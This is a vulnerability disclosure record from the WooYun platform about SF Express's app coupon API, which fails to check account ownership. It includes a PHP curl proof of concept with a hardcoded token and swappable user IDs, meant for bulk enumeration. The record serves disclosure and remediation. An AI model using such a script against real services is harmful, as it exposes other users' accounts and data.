{"id": 46957, "wybug_id": "wooyun-2014-088606", "wybug_title": "顺丰app验证用户漏洞可以批量获得他人优惠券", "wybug_corp": "顺丰速运", "wybug_author": "wellbug", "wybug_date": "2014-12-25 21:04", "wybug_open_date": "2015-02-08 21:06", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["顺丰优惠券"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-08：\t细节向公众公开  简要描述： 顺丰速递app在查询顺丰优惠券时没有验证当前登录的账号,导致可以查看其他账号下的顺丰券 详细说明：  \n$nn=800008231073;$url = \"http://abs-core.sf-express.com/api/user/getCoupons\";    $ch = curl_init();\t$request='status=%27EFFE%27%2C&amt=&couponType=&method=getCoupons&user_id='.$nn;\tcurl_setopt($ch, CURLOPT_POSTFIELDS, $request);    curl_setopt($ch, CURLOPT_URL, $url); \tcurl_setopt($ch, CURLOPT_HTTPHEADER, array('token:xhGXygoAVBF1qFpZZrUuccFznrTXK23V','userid:800008495436'));\tcurl_setopt($ch, CURLOPT_CONNECTTIMEOUT,1);   curl_setopt($ch, CURLOPT_NOSIGNAL,500);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    curl_setopt($ch, CURLOPT_HEADER, 0); $re=curl_exec($ch);     curl_close($ch);\t$re= json_decode($re);\tprint_r($re);\n以上是demo$nn是账号id,可以随意换,很容易做个批量扫描软件.   漏洞证明：  \n\n譬如这是扫描出来的优惠券   修复方案：  array('token:xhGXygoAVBF1qFpZZrUuccFznrTXK23V','userid:800008495436'));对这个进行验证\n<?phplogin('800008231073');\tfunction login($nn) {  //login$url = \"http://abs-core.sf-express.com/api/user/getCoupons\";    $ch = curl_init();\t$request='status=%27EFFE%27%2C&amt=&couponType=&method=getCoupons&user_id='.$nn;\tcurl_setopt($ch, CURLOPT_POSTFIELDS, $request);    curl_setopt($ch, CURLOPT_URL, $url); \tcurl_setopt($ch, CURLOPT_HTTPHEADER, array('token:xhGXygoAVBF1qFpZZrUuccFznrTXK23V','userid:800008490435'));\tcurl_setopt($ch, CURLOPT_CONNECTTIMEOUT,1);   curl_setopt($ch, CURLOPT_NOSIGNAL,500);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    curl_setopt($ch, CURLOPT_HEADER, 0); $re=curl_exec($ch);     curl_close($ch);\t$re= json_decode($re);\t  print_r($re);    return $re;\t}?>\n   版权声明：转载请注明来源 wellbug@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-12-30 08:29 厂商回复： 非常感谢！已通知研发进行处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-30 18:55 |    \t\twellbug \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:1        | 为人民服务)\t\t \n  不送点顺丰券给我寄个快递吗T_T    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}